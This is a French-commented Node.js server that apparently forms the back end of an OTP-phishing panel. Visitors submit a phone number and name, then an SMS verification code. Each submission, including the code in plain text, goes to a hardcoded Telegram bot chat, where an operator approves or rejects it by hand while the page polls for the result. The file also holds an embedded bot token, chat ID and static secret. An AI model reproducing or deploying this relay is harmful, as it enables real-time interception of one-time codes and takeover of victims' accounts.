const http = require("http");
const https = require("https");
const url = require("url");
const fs = require("fs");
const path = require("path");

const BOT_TOKEN  = "8760704998:AAHGLmS8HbzqCSGq03AnGci7beAbx6TPC5U";
const CHAT_ID    = "8598761284";
const SECRET     = "verif2024secure";
const PORT       = process.env.PORT || 3000;
const SERVER_URL = process.env.SERVER_URL || "https://verify-app-d3k0.onrender.com";

// Stockage en mémoire
const approvals    = {}; // phone -> true/false  (étape 1 : accès)
const otpApprovals = {}; // phone -> true/false  (étape 2 : OTP)
const pending      = {}; // phone -> timestamp

function sendJSON(res, statusCode, data) {
  res.writeHead(statusCode, {
    "Content-Type": "application/json",
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
  });
  res.end(JSON.stringify(data));
}

function sendHTML(res, html) {
  res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
  res.end(html);
}

function telegramRequest(method, params) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify(params);
    const options = {
      hostname: "api.telegram.org",
      path: `/bot${BOT_TOKEN}/${method}`,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(body),
      },
    };
    const req = https.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => {
        try { resolve(JSON.parse(data)); }
        catch(e) { reject(e); }
      });
    });
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

function pageHTML(icon, title, message, color) {
  return `<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>${title}</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0a0e1a;color:white;
         display:flex;align-items:center;justify-content:center;min-height:100vh;padding:1rem}
    .card{background:#111827;border:1px solid rgba(255,255,255,0.07);border-radius:20px;
          padding:2.5rem 2rem;text-align:center;max-width:380px;width:100%}
    .icon{font-size:56px;margin-bottom:1rem}
    h2{font-size:20px;font-weight:700;margin-bottom:0.75rem;color:${color}}
    p{font-size:14px;color:#64748b;line-height:1.6}
    strong{color:white}
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">${icon}</div>
    <h2>${title}</h2>
    <p>${message}</p>
  </div>
</body>
</html>`;
}

const server = http.createServer(async (req, res) => {
  const parsed   = url.parse(req.url, true);
  const pathname = parsed.pathname;
  const query    = parsed.query;

  if (req.method === "OPTIONS") { sendJSON(res, 200, {}); return; }

  // ── Servir index.html ──
  if (pathname === "/" && req.method === "GET") {
    const filePath = path.join(__dirname, "index.html");
    if (fs.existsSync(filePath)) {
      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      fs.createReadStream(filePath).pipe(res);
    } else {
      sendJSON(res, 404, { error: "index.html introuvable" });
    }
    return;
  }

  // ── POST /send-request : l'user soumet son numéro ──
  if (pathname === "/send-request" && req.method === "POST") {
    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", async () => {
      try {
        const { phone, username } = JSON.parse(body);
        if (!phone) return sendJSON(res, 400, { error: "Numéro manquant" });
        const cleanPhone = phone.replace(/[^0-9+]/g, "");
        pending[cleanPhone] = Date.now();

        const approveUrl = `${SERVER_URL}/approve?phone=${encodeURIComponent(cleanPhone)}&secret=${SECRET}`;
        const rejectUrl  = `${SERVER_URL}/reject?phone=${encodeURIComponent(cleanPhone)}&secret=${SECRET}`;

        const message =
          `🔔 *Nouvelle demande d'accès*\n\n` +
          `👤 Nom : *${username || "Non renseigné"}*\n` +
          `📱 Numéro : \`${cleanPhone}\`\n` +
          `🕐 ${new Date().toLocaleString("fr-FR")}\n\n` +
          `✅ [APPROUVER L'ACCÈS](${approveUrl})\n\n` +
          `❌ [REFUSER L'ACCÈS](${rejectUrl})`;

        const tgRes = await telegramRequest("sendMessage", {
          chat_id: CHAT_ID, text: message,
          parse_mode: "Markdown", disable_web_page_preview: true,
        });
        if (tgRes.ok) sendJSON(res, 200, { ok: true });
        else sendJSON(res, 500, { error: tgRes.description || "Erreur Telegram" });
      } catch (e) { sendJSON(res, 500, { error: e.message }); }
    });
    return;
  }

  // ── POST /verify-otp : l'user soumet son code OTP ──
  if (pathname === "/verify-otp" && req.method === "POST") {
    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", async () => {
      try {
        const { phone, code } = JSON.parse(body);
        if (!phone || !code) return sendJSON(res, 400, { error: "Données manquantes" });
        const cleanPhone = phone.replace(/[^0-9+]/g, "");

        const approveUrl = `${SERVER_URL}/approve-otp?phone=${encodeURIComponent(cleanPhone)}&code=${encodeURIComponent(code)}&secret=${SECRET}`;
        const rejectUrl  = `${SERVER_URL}/reject-otp?phone=${encodeURIComponent(cleanPhone)}&secret=${SECRET}`;

        const message =
          `🔢 *Vérification du code OTP*\n\n` +
          `📱 Numéro : \`${cleanPhone}\`\n` +
          `🔑 Code entré : *${code}*\n` +
          `🕐 ${new Date().toLocaleString("fr-FR")}\n\n` +
          `✅ [CONFIRMER LE CODE](${approveUrl})\n\n` +
          `❌ [REFUSER LE CODE](${rejectUrl})`;

        const tgRes = await telegramRequest("sendMessage", {
          chat_id: CHAT_ID, text: message,
          parse_mode: "Markdown", disable_web_page_preview: true,
        });
        if (tgRes.ok) sendJSON(res, 200, { ok: true });
        else sendJSON(res, 500, { error: tgRes.description || "Erreur Telegram" });
      } catch (e) { sendJSON(res, 500, { error: e.message }); }
    });
    return;
  }

  // ── GET /approve : approuver l'accès (étape 1) ──
  if (pathname === "/approve" && req.method === "GET") {
    const { phone, secret } = query;
    if (secret !== SECRET) { sendHTML(res, pageHTML("🚫", "Lien invalide", "Ce lien est invalide ou expiré.", "#ef4444")); return; }
    approvals[phone] = true;
    await telegramRequest("sendMessage", {
      chat_id: CHAT_ID,
      text: `✅ Accès *approuvé* pour \`${phone}\` — l'utilisateur passe à la vérification OTP.`,
      parse_mode: "Markdown",
    }).catch(() => {});
    sendHTML(res, pageHTML("✅", "Accès approuvé !", `Le numéro <strong>${phone}</strong> est autorisé.<br><br>L'utilisateur va recevoir son code SMS.`, "#10b981"));
    return;
  }

  // ── GET /reject : refuser l'accès (étape 1) ──
  if (pathname === "/reject" && req.method === "GET") {
    const { phone, secret } = query;
    if (secret !== SECRET) { sendHTML(res, pageHTML("🚫", "Lien invalide", "Ce lien est invalide.", "#ef4444")); return; }
    approvals[phone] = false;
    delete pending[phone];
    await telegramRequest("sendMessage", {
      chat_id: CHAT_ID,
      text: `❌ Accès *refusé* pour \`${phone}\`.`,
      parse_mode: "Markdown",
    }).catch(() => {});
    sendHTML(res, pageHTML("❌", "Accès refusé", `Le numéro <strong>${phone}</strong> a été bloqué.`, "#ef4444"));
    return;
  }

  // ── GET /approve-otp : confirmer le code OTP (étape 2) ──
  if (pathname === "/approve-otp" && req.method === "GET") {
    const { phone, code, secret } = query;
    if (secret !== SECRET) { sendHTML(res, pageHTML("🚫", "Lien invalide", "Ce lien est invalide ou expiré.", "#ef4444")); return; }
    otpApprovals[phone] = true;
    await telegramRequest("sendMessage", {
      chat_id: CHAT_ID,
      text: `✅ Code OTP *confirmé* pour \`${phone}\` — accès total accordé.`,
      parse_mode: "Markdown",
    }).catch(() => {});
    sendHTML(res, pageHTML("✅", "Code confirmé !", `Le code <strong>${code}</strong> pour <strong>${phone}</strong> a été validé.<br><br>L'utilisateur a maintenant accès complet.`, "#10b981"));
    return;
  }

  // ── GET /reject-otp : refuser le code OTP (étape 2) ──
  if (pathname === "/reject-otp" && req.method === "GET") {
    const { phone, secret } = query;
    if (secret !== SECRET) { sendHTML(res, pageHTML("🚫", "Lien invalide", "Ce lien est invalide.", "#ef4444")); return; }
    otpApprovals[phone] = false;
    await telegramRequest("sendMessage", {
      chat_id: CHAT_ID,
      text: `❌ Code OTP *refusé* pour \`${phone}\`.`,
      parse_mode: "Markdown",
    }).catch(() => {});
    sendHTML(res, pageHTML("❌", "Code refusé", `Le code OTP de <strong>${phone}</strong> a été rejeté.`, "#ef4444"));
    return;
  }

  // ── GET /check-approval : poll étape 1 ──
  if (pathname === "/check-approval" && req.method === "GET") {
    const { phone, secret } = query;
    if (secret !== SECRET) return sendJSON(res, 403, { error: "Interdit" });
    const status = approvals[phone];
    if (status === true)  { delete approvals[phone]; return sendJSON(res, 200, { approved: true,  rejected: false }); }
    if (status === false) { delete approvals[phone]; return sendJSON(res, 200, { approved: false, rejected: true  }); }
    return sendJSON(res, 200, { approved: false, rejected: false });
  }

  // ── GET /check-otp : poll étape 2 ──
  if (pathname === "/check-otp" && req.method === "GET") {
    const { phone, secret } = query;
    if (secret !== SECRET) return sendJSON(res, 403, { error: "Interdit" });
    const status = otpApprovals[phone];
    if (status === true)  { delete otpApprovals[phone]; return sendJSON(res, 200, { approved: true,  rejected: false }); }
    if (status === false) { delete otpApprovals[phone]; return sendJSON(res, 200, { approved: false, rejected: true  }); }
    return sendJSON(res, 200, { approved: false, rejected: false });
  }

  sendJSON(res, 404, { error: "Route inconnue" });
});

server.listen(PORT, () => {
  console.log(`✅ Serveur démarré sur le port ${PORT}`);
  console.log(`📡 URL : ${SERVER_URL}`);
});
